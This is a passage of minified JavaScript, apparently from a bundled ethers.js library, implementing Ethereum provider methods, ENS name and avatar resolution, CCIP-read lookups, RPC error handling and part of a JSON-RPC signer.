o=s==="erc721"?"0xc87b56dd":"0x0e89341c";e.push({type:s,content:r});const a=this._resolvedAddress||(yield this.getAddress()),c=(i[2]||"").split("/");if(c.length!==2)return null;const u=yield this.provider.formatter.address(c[0]),l=Vt(ne.from(c[1]).toHexString(),32);if(s==="erc721"){const m=this.provider.formatter.callAddress(yield this.provider.call({to:u,data:dn(["0x6352211e",l])}));if(a!==m)return null;e.push({type:"owner",content:m})}else if(s==="erc1155"){const m=ne.from(yield this.provider.call({to:u,data:dn(["0x00fdd58e",Vt(a,32),l])}));if(m.isZero())return null;e.push({type:"balance",content:m.toString()})}const h={to:this.provider.formatter.address(c[0]),data:dn([o,l])};let d=Id(yield this.provider.call(h),0);if(d==null)return null;e.push({type:"metadata-url-base",content:d}),s==="erc1155"&&(d=d.replace("{id}",l.substring(2)),e.push({type:"metadata-url-expanded",content:d})),d.match(/^ipfs:/i)&&(d=lm(d)),e.push({type:"metadata-url",content:d});const g=yield nw(d);if(!g)return null;e.push({type:"metadata",content:JSON.stringify(g)});let y=g.image;if(typeof y!="string")return null;if(!y.match(/^(https:\/\/|data:)/i)){if(y.match(tS)==null)return null;e.push({type:"url-ipfs",content:y}),y=lm(y)}return e.push({type:"url",content:y}),{linkage:e,url:y}}}}}catch{}return null})}getContentHash(){return Se(this,void 0,void 0,function*(){const e=yield this._fetchBytes("0xbc1c58d1");if(e==null||e==="0x")return null;const r=e.match(/^0xe3010170(([0-9a-f][0-9a-f])([0-9a-f][0-9a-f])([0-9a-f]*))$/);if(r){const o=parseInt(r[3],16);if(r[4].length===o*2)return"ipfs://"+F0.encode("0x"+r[1])}const n=e.match(/^0xe5010172(([0-9a-f][0-9a-f])([0-9a-f][0-9a-f])([0-9a-f]*))$/);if(n){const o=parseInt(n[3],16);if(n[4].length===o*2)return"ipns://"+F0.encode("0x"+n[1])}const i=e.match(/^0xe40101fa011b20([0-9a-f]*)$/);if(i&&i[1].length===32*2)return"bzz://"+i[1];const s=e.match(/^0x90b2c605([0-9a-f]*)$/);if(s&&s[1].length===34*2){const o={"=":"","+":"-","/":"_"};return"sia://"+kx("0x"+s[1]).replace(/[=+\/]/g,c=>o[c])}return Be.throwError("invalid or unsupported content hash data",H.errors.UNSUPPORTED_OPERATION,{operation:"getContentHash()",data:e})})}getText(e){return Se(this,void 0,void 0,function*(){let r=Gi(e);r=Pn([um(64),um(r.length),r]),r.length%32!==0&&(r=Pn([r,Vt("0x",32-e.length%32)]));const n=yield this._fetchBytes("0x59d1d43c",we(r));return n==null||n==="0x"?null:wh(n)})}}let hm=null,FQ=1;class jQ extends np{constructor(e){if(super(),this._events=[],this._emitted={block:-2},this.disableCcipRead=!1,this.formatter=new.target.getFormatter(),X(this,"anyNetwork",e==="any"),this.anyNetwork&&(e=this.detectNetwork()),e instanceof Promise)this._networkPromise=e,e.catch(r=>{}),this._ready().catch(r=>{});else{const r=Bi(new.target,"getNetwork")(e);r?(X(this,"_network",r),this.emit("network",r,null)):Be.throwArgumentError("invalid network","network",e)}this._maxInternalBlockNumber=-1024,this._lastBlockNumber=-2,this._maxFilterBlockRange=10,this._pollingInterval=4e3,this._fastQueryDate=0}_ready(){return Se(this,void 0,void 0,function*(){if(this._network==null){let e=null;if(this._networkPromise)try{e=yield this._networkPromise}catch{}e==null&&(e=yield this.detectNetwork()),e||Be.throwError("no network detected",H.errors.UNKNOWN_ERROR,{}),this._network==null&&(this.anyNetwork?this._network=e:X(this,"_network",e),this.emit("network",e,null))}return this._network})}get ready(){return Iu(()=>this._ready().then(e=>e,e=>{if(!(e.code===H.errors.NETWORK_ERROR&&e.event==="noNetwork"))throw e}))}static getFormatter(){return hm==null&&(hm=new ge),hm}static getNetwork(e){return IQ(e??"homestead")}ccipReadFetch(e,r,n){return Se(this,void 0,void 0,function*(){if(this.disableCcipRead||n.length===0)return null;const i=e.to.toLowerCase(),s=r.toLowerCase(),o=[];for(let a=0;a<n.length;a++){const c=n[a],u=c.replace("{sender}",i).replace("{data}",s),l=c.indexOf("{data}")>=0?null:JSON.stringify({data:s,sender:i}),h=yield nw({url:u,errorPassThrough:!0},l,(g,y)=>(g.status=y.statusCode,g));if(h.data)return h.data;const d=h.message||"unknown error";if(h.status>=400&&h.status<500)return Be.throwError(`response not found during CCIP fetch: ${d}`,H.errors.SERVER_ERROR,{url:c,errorMessage:d});o.push(d)}return Be.throwError(`error encountered during CCIP fetch: ${o.map(a=>JSON.stringify(a)).join(", ")}`,H.errors.SERVER_ERROR,{urls:n,errorMessages:o})})}_getInternalBlockNumber(e){return Se(this,void 0,void 0,function*(){if(yield this._ready(),e>0)for(;this._internalBlockNumber;){const i=this._internalBlockNumber;try{const s=yield i;if(yu()-s.respTime<=e)return s.blockNumber;break}catch{if(this._internalBlockNumber===i)break}}const r=yu(),n=sr({blockNumber:this.perform("getBlockNumber",{}),networkError:this.getNetwork().then(i=>null,i=>i)}).then(({blockNumber:i,networkError:s})=>{if(s)throw this._internalBlockNumber===n&&(this._internalBlockNumber=null),s;const o=yu();return i=ne.from(i).toNumber(),i<this._maxInternalBlockNumber&&(i=this._maxInternalBlockNumber),this._maxInternalBlockNumber=i,this._setFastBlockNumber(i),{blockNumber:i,reqTime:r,respTime:o}});return this._internalBlockNumber=n,n.catch(i=>{this._internalBlockNumber===n&&(this._internalBlockNumber=null)}),(yield n).blockNumber})}poll(){return Se(this,void 0,void 0,function*(){const e=FQ++,r=[];let n=null;try{n=yield this._getInternalBlockNumber(100+this.pollingInterval/2)}catch(i){this.emit("error",i);return}if(this._setFastBlockNumber(n),this.emit("poll",e,n),n===this._lastBlockNumber){this.emit("didPoll",e);return}if(this._emitted.block===-2&&(this._emitted.block=n-1),Math.abs(this._emitted.block-n)>1e3)Be.warn(`network block skew detected; skipping block events (emitted=${this._emitted.block} blockNumber${n})`),this.emit("error",Be.makeError("network block skew detected",H.errors.NETWORK_ERROR,{blockNumber:n,event:"blockSkew",previousBlockNumber:this._emitted.block})),this.emit("block",n);else for(let i=this._emitted.block+1;i<=n;i++)this.emit("block",i);this._emitted.block!==n&&(this._emitted.block=n,Object.keys(this._emitted).forEach(i=>{if(i==="block")return;const s=this._emitted[i];s!=="pending"&&n-s>12&&delete this._emitted[i]})),this._lastBlockNumber===-2&&(this._lastBlockNumber=n-1),this._events.forEach(i=>{switch(i.type){case"tx":{const s=i.hash;let o=this.getTransactionReceipt(s).then(a=>(!a||a.blockNumber==null||(this._emitted["t:"+s]=a.blockNumber,this.emit(s,a)),null)).catch(a=>{this.emit("error",a)});r.push(o);break}case"filter":{if(!i._inflight){i._inflight=!0,i._lastBlockNumber===-2&&(i._lastBlockNumber=n-1);const s=i.filter;s.fromBlock=i._lastBlockNumber+1,s.toBlock=n;const o=s.toBlock-this._maxFilterBlockRange;o>s.fromBlock&&(s.fromBlock=o),s.fromBlock<0&&(s.fromBlock=0);const a=this.getLogs(s).then(c=>{i._inflight=!1,c.length!==0&&c.forEach(u=>{u.blockNumber>i._lastBlockNumber&&(i._lastBlockNumber=u.blockNumber),this._emitted["b:"+u.blockHash]=u.blockNumber,this._emitted["t:"+u.transactionHash]=u.blockNumber,this.emit(s,u)})}).catch(c=>{this.emit("error",c),i._inflight=!1});r.push(a)}break}}}),this._lastBlockNumber=n,Promise.all(r).then(()=>{this.emit("didPoll",e)}).catch(i=>{this.emit("error",i)})})}resetEventsBlock(e){this._lastBlockNumber=e-1,this.polling&&this.poll()}get network(){return this._network}detectNetwork(){return Se(this,void 0,void 0,function*(){return Be.throwError("provider does not support network detection",H.errors.UNSUPPORTED_OPERATION,{operation:"provider.detectNetwork"})})}getNetwork(){return Se(this,void 0,void 0,function*(){const e=yield this._ready(),r=yield this.detectNetwork();if(e.chainId!==r.chainId){if(this.anyNetwork)return this._network=r,this._lastBlockNumber=-2,this._fastBlockNumber=null,this._fastBlockNumberPromise=null,this._fastQueryDate=0,this._emitted.block=-2,this._maxInternalBlockNumber=-1024,this._internalBlockNumber=null,this.emit("network",r,e),yield w1(0),this._network;const n=Be.makeError("underlying network changed",H.errors.NETWORK_ERROR,{event:"changed",network:e,detectedNetwork:r});throw this.emit("error",n),n}return e})}get blockNumber(){return this._getInternalBlockNumber(100+this.pollingInterval/2).then(e=>{this._setFastBlockNumber(e)},e=>{}),this._fastBlockNumber!=null?this._fastBlockNumber:-1}get polling(){return this._poller!=null}set polling(e){e&&!this._poller?(this._poller=setInterval(()=>{this.poll()},this.pollingInterval),this._bootstrapPoll||(this._bootstrapPoll=setTimeout(()=>{this.poll(),this._bootstrapPoll=setTimeout(()=>{this._poller||this.poll(),this._bootstrapPoll=null},this.pollingInterval)},0))):!e&&this._poller&&(clearInterval(this._poller),this._poller=null)}get pollingInterval(){return this._pollingInterval}set pollingInterval(e){if(typeof e!="number"||e<=0||parseInt(String(e))!=e)throw new Error("invalid polling interval");this._pollingInterval=e,this._poller&&(clearInterval(this._poller),this._poller=setInterval(()=>{this.poll()},this._pollingInterval))}_getFastBlockNumber(){const e=yu();return e-this._fastQueryDate>2*this._pollingInterval&&(this._fastQueryDate=e,this._fastBlockNumberPromise=this.getBlockNumber().then(r=>((this._fastBlockNumber==null||r>this._fastBlockNumber)&&(this._fastBlockNumber=r),this._fastBlockNumber))),this._fastBlockNumberPromise}_setFastBlockNumber(e){this._fastBlockNumber!=null&&e<this._fastBlockNumber||(this._fastQueryDate=yu(),(this._fastBlockNumber==null||e>this._fastBlockNumber)&&(this._fastBlockNumber=e,this._fastBlockNumberPromise=Promise.resolve(e)))}waitForTransaction(e,r,n){return Se(this,void 0,void 0,function*(){return this._waitForTransaction(e,r??1,n||0,null)})}_waitForTransaction(e,r,n,i){return Se(this,void 0,void 0,function*(){const s=yield this.getTransactionReceipt(e);return(s?s.confirmations:0)>=r?s:new Promise((o,a)=>{const c=[];let u=!1;const l=function(){return u?!0:(u=!0,c.forEach(d=>{d()}),!1)},h=d=>{d.confirmations<r||l()||o(d)};if(this.on(e,h),c.push(()=>{this.removeListener(e,h)}),i){let d=i.startBlock,g=null;const y=m=>Se(this,void 0,void 0,function*(){u||(yield w1(1e3),this.getTransactionCount(i.from).then(b=>Se(this,void 0,void 0,function*(){if(!u){if(b<=i.nonce)d=m;else{{const A=yield this.getTransaction(e);if(A&&A.blockNumber!=null)return}for(g==null&&(g=d-3,g<i.startBlock&&(g=i.startBlock));g<=m;){if(u)return;const A=yield this.getBlockWithTransactions(g);for(let _=0;_<A.transactions.length;_++){const T=A.transactions[_];if(T.hash===e)return;if(T.from===i.from&&T.nonce===i.nonce){if(u)return;const P=yield this.waitForTransaction(T.hash,r);if(l())return;let S="replaced";T.data===i.data&&T.to===i.to&&T.value.eq(i.value)?S="repriced":T.data==="0x"&&T.from===T.to&&T.value.isZero()&&(S="cancelled"),a(Be.makeError("transaction was replaced",H.errors.TRANSACTION_REPLACED,{cancelled:S==="replaced"||S==="cancelled",reason:S,replacement:this._wrapTransaction(T),hash:e,receipt:P}));return}}g++}}u||this.once("block",y)}}),b=>{u||this.once("block",y)}))});if(u)return;this.once("block",y),c.push(()=>{this.removeListener("block",y)})}if(typeof n=="number"&&n>0){const d=setTimeout(()=>{l()||a(Be.makeError("timeout exceeded",H.errors.TIMEOUT,{timeout:n}))},n);d.unref&&d.unref(),c.push(()=>{clearTimeout(d)})}})})}getBlockNumber(){return Se(this,void 0,void 0,function*(){return this._getInternalBlockNumber(0)})}getGasPrice(){return Se(this,void 0,void 0,function*(){yield this.getNetwork();const e=yield this.perform("getGasPrice",{});try{return ne.from(e)}catch(r){return Be.throwError("bad result from backend",H.errors.SERVER_ERROR,{method:"getGasPrice",result:e,error:r})}})}getBalance(e,r){return Se(this,void 0,void 0,function*(){yield this.getNetwork();const n=yield sr({address:this._getAddress(e),blockTag:this._getBlockTag(r)}),i=yield this.perform("getBalance",n);try{return ne.from(i)}catch(s){return Be.throwError("bad result from backend",H.errors.SERVER_ERROR,{method:"getBalance",params:n,result:i,error:s})}})}getTransactionCount(e,r){return Se(this,void 0,void 0,function*(){yield this.getNetwork();const n=yield sr({address:this._getAddress(e),blockTag:this._getBlockTag(r)}),i=yield this.perform("getTransactionCount",n);try{return ne.from(i).toNumber()}catch(s){return Be.throwError("bad result from backend",H.errors.SERVER_ERROR,{method:"getTransactionCount",params:n,result:i,error:s})}})}getCode(e,r){return Se(this,void 0,void 0,function*(){yield this.getNetwork();const n=yield sr({address:this._getAddress(e),blockTag:this._getBlockTag(r)}),i=yield this.perform("getCode",n);try{return we(i)}catch(s){return Be.throwError("bad result from backend",H.errors.SERVER_ERROR,{method:"getCode",params:n,result:i,error:s})}})}getStorageAt(e,r,n){return Se(this,void 0,void 0,function*(){yield this.getNetwork();const i=yield sr({address:this._getAddress(e),blockTag:this._getBlockTag(n),position:Promise.resolve(r).then(o=>Vy(o))}),s=yield this.perform("getStorageAt",i);try{return we(s)}catch(o){return Be.throwError("bad result from backend",H.errors.SERVER_ERROR,{method:"getStorageAt",params:i,result:s,error:o})}})}_wrapTransaction(e,r,n){if(r!=null&&fa(r)!==32)throw new Error("invalid response - sendTransaction");const i=e;return r!=null&&e.hash!==r&&Be.throwError("Transaction hash mismatch from Provider.sendTransaction.",H.errors.UNKNOWN_ERROR,{expectedHash:e.hash,returnedHash:r}),i.wait=(s,o)=>Se(this,void 0,void 0,function*(){s==null&&(s=1),o==null&&(o=0);let a;s!==0&&n!=null&&(a={data:e.data,from:e.from,nonce:e.nonce,to:e.to,value:e.value,startBlock:n});const c=yield this._waitForTransaction(e.hash,s,o,a);return c==null&&s===0?null:(this._emitted["t:"+e.hash]=c.blockNumber,c.status===0&&Be.throwError("transaction failed",H.errors.CALL_EXCEPTION,{transactionHash:e.hash,transaction:e,receipt:c}),c)}),i}sendTransaction(e){return Se(this,void 0,void 0,function*(){yield this.getNetwork();const r=yield Promise.resolve(e).then(s=>we(s)),n=this.formatter.transaction(e);n.confirmations==null&&(n.confirmations=0);const i=yield this._getInternalBlockNumber(100+2*this.pollingInterval);try{const s=yield this.perform("sendTransaction",{signedTransaction:r});return this._wrapTransaction(n,s,i)}catch(s){throw s.transaction=n,s.transactionHash=n.hash,s}})}_getTransactionRequest(e){return Se(this,void 0,void 0,function*(){const r=yield e,n={};return["from","to"].forEach(i=>{r[i]!=null&&(n[i]=Promise.resolve(r[i]).then(s=>s?this._getAddress(s):null))}),["gasLimit","gasPrice","maxFeePerGas","maxPriorityFeePerGas","value"].forEach(i=>{r[i]!=null&&(n[i]=Promise.resolve(r[i]).then(s=>s?ne.from(s):null))}),["type"].forEach(i=>{r[i]!=null&&(n[i]=Promise.resolve(r[i]).then(s=>s??null))}),r.accessList&&(n.accessList=this.formatter.accessList(r.accessList)),["data"].forEach(i=>{r[i]!=null&&(n[i]=Promise.resolve(r[i]).then(s=>s?we(s):null))}),this.formatter.transactionRequest(yield sr(n))})}_getFilter(e){return Se(this,void 0,void 0,function*(){e=yield e;const r={};return e.address!=null&&(r.address=this._getAddress(e.address)),["blockHash","topics"].forEach(n=>{e[n]!=null&&(r[n]=e[n])}),["fromBlock","toBlock"].forEach(n=>{e[n]!=null&&(r[n]=this._getBlockTag(e[n]))}),this.formatter.filter(yield sr(r))})}_call(e,r,n){return Se(this,void 0,void 0,function*(){n>=DQ&&Be.throwError("CCIP read exceeded maximum redirections",H.errors.SERVER_ERROR,{redirects:n,transaction:e});const i=e.to,s=yield this.perform("call",{transaction:e,blockTag:r});if(n>=0&&r==="latest"&&i!=null&&s.substring(0,10)==="0x556f1830"&&fa(s)%32===4)try{const o=qr(s,4),a=qr(o,0,32);ne.from(a).eq(i)||Be.throwError("CCIP Read sender did not match",H.errors.CALL_EXCEPTION,{name:"OffchainLookup",signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",transaction:e,data:s});const c=[],u=ne.from(qr(o,32,64)).toNumber(),l=ne.from(qr(o,u,u+32)).toNumber(),h=qr(o,u+32);for(let A=0;A<l;A++){const _=Id(h,A*32);_==null&&Be.throwError("CCIP Read contained corrupt URL string",H.errors.CALL_EXCEPTION,{name:"OffchainLookup",signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",transaction:e,data:s}),c.push(_)}const d=Hl(o,64);ne.from(qr(o,100,128)).isZero()||Be.throwError("CCIP Read callback selector included junk",H.errors.CALL_EXCEPTION,{name:"OffchainLookup",signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",transaction:e,data:s});const g=qr(o,96,100),y=Hl(o,128),m=yield this.ccipReadFetch(e,d,c);m==null&&Be.throwError("CCIP Read disabled or provided no URLs",H.errors.CALL_EXCEPTION,{name:"OffchainLookup",signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",transaction:e,data:s});const b={to:i,data:dn([g,rS([m,y])])};return this._call(b,r,n+1)}catch(o){if(o.code===H.errors.SERVER_ERROR)throw o}try{return we(s)}catch(o){return Be.throwError("bad result from backend",H.errors.SERVER_ERROR,{method:"call",params:{transaction:e,blockTag:r},result:s,error:o})}})}call(e,r){return Se(this,void 0,void 0,function*(){yield this.getNetwork();const n=yield sr({transaction:this._getTransactionRequest(e),blockTag:this._getBlockTag(r),ccipReadEnabled:Promise.resolve(e.ccipReadEnabled)});return this._call(n.transaction,n.blockTag,n.ccipReadEnabled?0:-1)})}estimateGas(e){return Se(this,void 0,void 0,function*(){yield this.getNetwork();const r=yield sr({transaction:this._getTransactionRequest(e)}),n=yield this.perform("estimateGas",r);try{return ne.from(n)}catch(i){return Be.throwError("bad result from backend",H.errors.SERVER_ERROR,{method:"estimateGas",params:r,result:n,error:i})}})}_getAddress(e){return Se(this,void 0,void 0,function*(){e=yield e,typeof e!="string"&&Be.throwArgumentError("invalid address or ENS name","name",e);const r=yield this.resolveName(e);return r==null&&Be.throwError("ENS name not configured",H.errors.UNSUPPORTED_OPERATION,{operation:`resolveName(${JSON.stringify(e)})`}),r})}_getBlock(e,r){return Se(this,void 0,void 0,function*(){yield this.getNetwork(),e=yield e;let n=-128;const i={includeTransactions:!!r};if(Ye(e,32))i.blockHash=e;else try{i.blockTag=yield this._getBlockTag(e),Ye(i.blockTag)&&(n=parseInt(i.blockTag.substring(2),16))}catch{Be.throwArgumentError("invalid block hash or block tag","blockHashOrBlockTag",e)}return Iu(()=>Se(this,void 0,void 0,function*(){const s=yield this.perform("getBlock",i);if(s==null)return i.blockHash!=null&&this._emitted["b:"+i.blockHash]==null||i.blockTag!=null&&n>this._emitted.block?null:void 0;if(r){let o=null;for(let c=0;c<s.transactions.length;c++){const u=s.transactions[c];if(u.blockNumber==null)u.confirmations=0;else if(u.confirmations==null){o==null&&(o=yield this._getInternalBlockNumber(100+2*this.pollingInterval));let l=o-u.blockNumber+1;l<=0&&(l=1),u.confirmations=l}}const a=this.formatter.blockWithTransactions(s);return a.transactions=a.transactions.map(c=>this._wrapTransaction(c)),a}return this.formatter.block(s)}),{oncePoll:this})})}getBlock(e){return this._getBlock(e,!1)}getBlockWithTransactions(e){return this._getBlock(e,!0)}getTransaction(e){return Se(this,void 0,void 0,function*(){yield this.getNetwork(),e=yield e;const r={transactionHash:this.formatter.hash(e,!0)};return Iu(()=>Se(this,void 0,void 0,function*(){const n=yield this.perform("getTransaction",r);if(n==null)return this._emitted["t:"+e]==null?null:void 0;const i=this.formatter.transactionResponse(n);if(i.blockNumber==null)i.confirmations=0;else if(i.confirmations==null){let o=(yield this._getInternalBlockNumber(100+2*this.pollingInterval))-i.blockNumber+1;o<=0&&(o=1),i.confirmations=o}return this._wrapTransaction(i)}),{oncePoll:this})})}getTransactionReceipt(e){return Se(this,void 0,void 0,function*(){yield this.getNetwork(),e=yield e;const r={transactionHash:this.formatter.hash(e,!0)};return Iu(()=>Se(this,void 0,void 0,function*(){const n=yield this.perform("getTransactionReceipt",r);if(n==null)return this._emitted["t:"+e]==null?null:void 0;if(n.blockHash==null)return;const i=this.formatter.receipt(n);if(i.blockNumber==null)i.confirmations=0;else if(i.confirmations==null){let o=(yield this._getInternalBlockNumber(100+2*this.pollingInterval))-i.blockNumber+1;o<=0&&(o=1),i.confirmations=o}return i}),{oncePoll:this})})}getLogs(e){return Se(this,void 0,void 0,function*(){yield this.getNetwork();const r=yield sr({filter:this._getFilter(e)}),n=yield this.perform("getLogs",r);return n.forEach(i=>{i.removed==null&&(i.removed=!1)}),ge.arrayOf(this.formatter.filterLog.bind(this.formatter))(n)})}getEtherPrice(){return Se(this,void 0,void 0,function*(){return yield this.getNetwork(),this.perform("getEtherPrice",{})})}_getBlockTag(e){return Se(this,void 0,void 0,function*(){if(e=yield e,typeof e=="number"&&e<0){e%1&&Be.throwArgumentError("invalid BlockTag","blockTag",e);let r=yield this._getInternalBlockNumber(100+2*this.pollingInterval);return r+=e,r<0&&(r=0),this.formatter.blockTag(r)}return this.formatter.blockTag(e)})}getResolver(e){return Se(this,void 0,void 0,function*(){let r=e;for(;;){if(r===""||r==="."||e!=="eth"&&r==="eth")return null;const n=yield this._getResolver(r,"getResolver");if(n!=null){const i=new A1(this,n,e);return r!==e&&!(yield i.supportsWildcard())?null:i}r=r.split(".").slice(1).join(".")}})}_getResolver(e,r){return Se(this,void 0,void 0,function*(){r==null&&(r="ENS");const n=yield this.getNetwork();n.ensAddress||Be.throwError("network does not support ENS",H.errors.UNSUPPORTED_OPERATION,{operation:r,network:n.name});try{const i=yield this.call({to:n.ensAddress,data:"0x0178b8bf"+Ed(e).substring(2)});return this.formatter.callAddress(i)}catch{}return null})}resolveName(e){return Se(this,void 0,void 0,function*(){e=yield e;try{return Promise.resolve(this.formatter.address(e))}catch(n){if(Ye(e))throw n}typeof e!="string"&&Be.throwArgumentError("invalid ENS name","name",e);const r=yield this.getResolver(e);return r?yield r.getAddress():null})}lookupAddress(e){return Se(this,void 0,void 0,function*(){e=yield e,e=this.formatter.address(e);const r=e.substring(2).toLowerCase()+".addr.reverse",n=yield this._getResolver(r,"lookupAddress");if(n==null)return null;const i=Id(yield this.call({to:n,data:"0x691f3431"+Ed(r).substring(2)}),0);return(yield this.resolveName(i))!=e?null:i})}getAvatar(e){return Se(this,void 0,void 0,function*(){let r=null;if(Ye(e)){const s=this.formatter.address(e).substring(2).toLowerCase()+".addr.reverse",o=yield this._getResolver(s,"getAvatar");if(!o)return null;r=new A1(this,o,s);try{const a=yield r.getAvatar();if(a)return a.url}catch(a){if(a.code!==H.errors.CALL_EXCEPTION)throw a}try{const a=Id(yield this.call({to:o,data:"0x691f3431"+Ed(s).substring(2)}),0);r=yield this.getResolver(a)}catch(a){if(a.code!==H.errors.CALL_EXCEPTION)throw a;return null}}else if(r=yield this.getResolver(e),!r)return null;const n=yield r.getAvatar();return n==null?null:n.url})}perform(e,r){return Be.throwError(e+" not implemented",H.errors.NOT_IMPLEMENTED,{operation:e})}_startEvent(e){this.polling=this._events.filter(r=>r.pollable()).length>0}_stopEvent(e){this.polling=this._events.filter(r=>r.pollable()).length>0}_addEventListener(e,r,n){const i=new UQ(Ga(e),r,n);return this._events.push(i),this._startEvent(i),this}on(e,r){return this._addEventListener(e,r,!1)}once(e,r){return this._addEventListener(e,r,!0)}emit(e,...r){let n=!1,i=[],s=Ga(e);return this._events=this._events.filter(o=>o.tag!==s?!0:(setTimeout(()=>{o.listener.apply(this,r)},0),n=!0,o.once?(i.push(o),!1):!0)),i.forEach(o=>{this._stopEvent(o)}),n}listenerCount(e){if(!e)return this._events.length;let r=Ga(e);return this._events.filter(n=>n.tag===r).length}listeners(e){if(e==null)return this._events.map(n=>n.listener);let r=Ga(e);return this._events.filter(n=>n.tag===r).map(n=>n.listener)}off(e,r){if(r==null)return this.removeAllListeners(e);const n=[];let i=!1,s=Ga(e);return this._events=this._events.filter(o=>o.tag!==s||o.listener!=r||i?!0:(i=!0,n.push(o),!1)),n.forEach(o=>{this._stopEvent(o)}),this}removeAllListeners(e){let r=[];if(e==null)r=this._events,this._events=[];else{const n=Ga(e);this._events=this._events.filter(i=>i.tag!==n?!0:(r.push(i),!1))}return r.forEach(n=>{this._stopEvent(n)}),this}}var as=function(t,e,r,n){function i(s){return s instanceof r?s:new r(function(o){o(s)})}return new(r||(r=Promise))(function(s,o){function a(l){try{u(n.next(l))}catch(h){o(h)}}function c(l){try{u(n.throw(l))}catch(h){o(h)}}function u(l){l.done?s(l.value):i(l.value).then(a,c)}u((n=n.apply(t,e||[])).next())})};const or=new H(ap),qQ=["call","estimateGas"];function Fu(t,e){if(t==null)return null;if(typeof t.message=="string"&&t.message.match("reverted")){const r=Ye(t.data)?t.data:null;if(!e||r)return{message:t.message,data:r}}if(typeof t=="object"){for(const r in t){const n=Fu(t[r],e);if(n)return n}return null}if(typeof t=="string")try{return Fu(JSON.parse(t),e)}catch{}return null}function nS(t,e,r){const n=r.transaction||r.signedTransaction;if(t==="call"){const s=Fu(e,!0);if(s)return s.data;or.throwError("missing revert data in call exception; Transaction reverted without a reason string",H.errors.CALL_EXCEPTION,{data:"0x",transaction:n,error:e})}if(t==="estimateGas"){let s=Fu(e.body,!1);s==null&&(s=Fu(e,!1)),s&&or.throwError("cannot estimate gas; transaction may fail or may require manual gas limit",H.errors.UNPREDICTABLE_GAS_LIMIT,{reason:s.message,method:t,transaction:n,error:e})}let i=e.message;throw e.code===H.errors.SERVER_ERROR&&e.error&&typeof e.error.message=="string"?i=e.error.message:typeof e.body=="string"?i=e.body:typeof e.responseText=="string"&&(i=e.responseText),i=(i||"").toLowerCase(),i.match(/insufficient funds|base fee exceeds gas limit|InsufficientFunds/i)&&or.throwError("insufficient funds for intrinsic transaction cost",H.errors.INSUFFICIENT_FUNDS,{error:e,method:t,transaction:n}),i.match(/nonce (is )?too low/i)&&or.throwError("nonce has already been used",H.errors.NONCE_EXPIRED,{error:e,method:t,transaction:n}),i.match(/replacement transaction underpriced|transaction gas price.*too low/i)&&or.throwError("replacement fee too low",H.errors.REPLACEMENT_UNDERPRICED,{error:e,method:t,transaction:n}),i.match(/only replay-protected/i)&&or.throwError("legacy pre-eip-155 transactions not supported",H.errors.UNSUPPORTED_OPERATION,{error:e,method:t,transaction:n}),qQ.indexOf(t)>=0&&i.match(/gas required exceeds allowance|always failing transaction|execution reverted|revert/)&&or.throwError("cannot estimate gas; transaction may fail or may require manual gas limit",H.errors.UNPREDICTABLE_GAS_LIMIT,{error:e,method:t,transaction:n}),e}function _1(t){return new Promise(function(e){setTimeout(e,t)})}function zQ(t){if(t.error){const e=new Error(t.error.message);throw e.code=t.error.code,e.data=t.error.data,e}return t.result}function wu(t){return t&&t.toLowerCase()}const j0={};class iS extends bh{constructor(e,r,n){if(super(),e!==j0)throw new Error("do not call the JsonRpcSigner constructor directly; use provider.getSigner");X(this,"provider",r),n==null&&(n=0),typeof n=="string"?(X(this,"_address",this.provider.formatter.address(n)),X(this,"_index",null)):typeof n=="number"?(X(this,"_index",n),X(this,"_address",null)):or.throwArgumentError("invalid address or index","addressOrIndex",n)}connect(e){return or.throwError("cannot alter JSON-RPC Signer connection",H.errors.UNSUPPORTED_OPERATION,{operation:"connect"})}connectUnchecked(){return new HQ(j0,this.provider,this._address||this._index)}getAddress(){return this._address?Promise.resolve(this._address):this.provider.send("eth_accounts",[]).then(e=>(e.length<=this._index&&or.throwError("unknown account #"+this._index,H.errors.UNSUPPORTED_OPERATION,{operation:"getAddress"}),this.provider.formatter.address(e[this._index])))}sendUncheckedTransaction(e){e=pr(e);const r=this.getAddress().then(n=>(n&&(n=n.toLowerCase()),n));if(e.gasLimit==null){const n=pr(e);n.from=r,e.gasLimit=this.provider.estimateGas(n)}return e.to!=null&&(e.to=Promise.resolve(e.to).then(n=>as(this,void 0,void 0,function*(){if(n==null)return null;const i=yield this.provider.resolveName(n);return i==null&&or.throwArgumentError("provided ENS name resolves to null","tx.to",n),i}))),sr({tx:sr(e),sender:r}).then(({tx:n,sender:i})=>{n.from!=null?n.from.toLowerCase()!==i&&or.throwArgumentError("from address mismatch","transaction",e):n.from=i;const s=this.provider.constructor.hexlifyTransaction(n,{from:!0});return this.provider.send("eth_sendTransaction",[s]).then(o=>o,o=>(typeof o.message=="string"&&o.message.match(/user denied/i)&&or.throwError("user rejected transaction",H.errors.ACTION_REJECTED,{action:"sendTransaction",transaction:n}),nS("sendTransaction",o,s)))})}signTransaction(e){return or.throwError("signing transactions is unsupported",H.errors.UNSUPPORTED_OPERATION,{operation:"signTransaction"})}sendTransaction(e){return as(this,void 0,void 0,function*(){const r=yield this.provider._getInternalBlockNumber(100+2*this.provider.pollingInterval),n=yield this.sendUncheckedTransaction(e);try{return yield Iu(()=>as(this,void 0,void 0,function*(){const i=yield this.provider.getTransaction(n);if(i!==null)return this.provider._wrapTransaction(i,n,r)}),{oncePoll:this.provider})}catch(i){throw i.transactionHash=n,i}})}signMessage(e){return as(this,void 0,void 0,function*(){const r=typeof e=="string"?Gi(e):e,n=yield this.getAddress();try{return yield this.provider.send("personal_sign",[we(r),n.toLowerCase()])}catch(i){throw typeof i.message=="string"&&i.message.match(/user denied/i)&&or.throwError("user rejected signing",H.errors.ACTION_REJECTED,{action:"signMessage",from:n,messageData:e}),i}})}_legacySignMessage(e){return as(this,void 0,void 0,function*(){const r=typeof e=="string"?Gi(e):e,n=yield this.getAddress();try{return yield this.provider.send("eth_sign",[n.toLowerCase(),we(r)])}catch(i){throw typeof i.message=="string"&&i.message.match(/user denied/i)&&or.throwError("user rejected signing",H.errors.ACTION_REJECTED,{action:"_legacySignMessage",from:n,messageData:e}),i}})}_signTypedData(e,r,n){return as(this,void 0,void 0,function*(){const i=yield _n.resolveNames(e,r,n,o=>this.provider.resolveName(o)),s=yield this.getAddress();try{return yield this.provider.send("eth_signTypedData_v4",[s.toLowerCase(),JSON.stringify(_n.getPayload(i.domain,r,i.value))])}catch(o){throw typeof o.message=="string"&&o.message.match(/user 